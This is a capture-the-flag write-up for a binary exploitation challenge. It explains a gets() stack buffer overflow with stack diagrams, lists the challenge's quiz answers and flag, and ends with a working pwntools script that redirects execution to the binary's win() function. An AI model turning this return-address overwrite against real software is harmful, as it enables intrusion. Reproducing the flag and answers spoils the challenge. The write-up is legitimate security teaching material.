# PWN - BEUS Level 1
**Author** : Lazar Mancic  
**Difficulty**: <font color='gold'>Medium</font>  
**Description**: Have you heard about the Binary Exploitation Unit of Serbia? This is their test, can you clear all the levels.

**External resources**:
- `pwn_beus_level1.zip` - [Download](public/pwn_beus_level1.zip)

**Flag**: ``SCC{0v3rfl0w1n6_buff3r_15_4lw4y5_4_w1n}``

# Writeup

## Enumeration

In this series of challenges, there are hints inside the questions about binary exploitation. You can find answers by reversing the binary.
```c
const char* questions[] = {
    "What does binary exploitation target?",
    "Where is the return address of a function stored?",
    "Where are local variables, like buffers, typically stored?",
    "Is using `gets()` considered safe?",
    "What is the vulnerability called when input exceeds buffer capacity?"
};

const char* answers[] = {
    "Memory", "Stack", "Stack", "No", "Buffer Overflow"
};
```
From this, we get the idea of finding a **Buffer Overflow** vulnerability inside the binary.

There is a `gets` function call on a buffer. This function reads input until a newline, so we can overflow the buffer by sending more than 128 characters.
```c
printf("Any last comment> ");
gets(buf);
```

## Exploitation

Now we have a vulnerability, but we need to find a way to exploit it. It is pretty straightforward— the return address of the `main()` function is stored right after our buffer, so we can change it.
```
┏━━━━━━━━━━━━━━━━━━━━━━┓ <- rsp (Stack Pointer)
┃ char buf[128]        ┃
┃                      ┃
┃                      ┃
┃                      ┃
┃                      ┃
┃                      ┃
┃                      ┃
┠┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┨ <- rsp+0x80
┃ align 0x8            ┃
┠┄┄┄┄┄┄┄┄┄┄┄┬┄┄┄┄┄┄┄┄┄┄┨ <- rsp+0x88
┃ align 0x4 ┆   int i  ┃
┠┄┄┄┄┄┄┄┄┄┄┄┴┄┄┄┄┄┄┄┄┄┄┨ <- rsp+0x90
┃ stored rbp           ┃
┠┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┨ <- rsp+0x98
┃ return address       ┃
┗━━━━━━━━━━━━━━━━━━━━━━┛
```
In the binary, there is a `win()` function which prints the flag.

The payload consists of `'A' * 0x98`, followed by `ret` and `win()`. The `ret` is a gadget or simply a return instruction somewhere in the binary to ensure **stack alignment**.

Your exploit might work locally but fail remotely without that, because some standard LIBC functions expect 16-byte alignment on a `call` instruction.
```
┏━━━━━━━━━━━━━━━━━━━━━━┓ <- rsp (Stack Pointer)
┃   A A A A A A A A    ┃
┃   A A A A A A A A    ┃
┃   A A A A A A A A    ┃
┃         ...          ┃
┃   A A A A A A A A    ┃
┃   A A A A A A A A    ┃
┃   A A A A A A A A    ┃
┠┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┨ <- rsp+0x80
┃   A A A A A A A A    ┃
┠┄┄┄┄┄┄┄┄┄┄┄┬┄┄┄┄┄┄┄┄┄┄┨ <- rsp+0x88
┃  A A A A  ┆ A A A A  ┃
┠┄┄┄┄┄┄┄┄┄┄┄┴┄┄┄┄┄┄┄┄┄┄┨ <- rsp+0x90
┃   A A A A A A A A    ┃
┠┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┨ <- rsp+0x98
┃ 0x401016 -> ret      ┃
┠┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┨ <- rsp+0xa0
┃ win() address        ┃
┗━━━━━━━━━━━━━━━━━━━━━━┛
```

## Solution

```py
from pwn import *

HOST = args.HOST or "localhost"
PORT = int(args.PORT or "1337")
FLAG = args.FLAG

context.log_level = 'ERROR'

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = process("./beus1", env={"FLAG": FLAG})
elf = context.binary = ELF("./beus1")

anss = [b"memory", b"stack", b"stack", b"no", b"buffer overflow"]

for ans in anss:
    p.sendlineafter(b"Answer> ", ans)

ret = 0x401016

payload = flat(
    b"A" * 0x98,
    ret,
    elf.sym.win
)

p.sendlineafter(b"comment> ", payload)

p.recvuntil(b"reward: ")
flag = p.recvline(False).decode()

print(flag)
p.close()
```
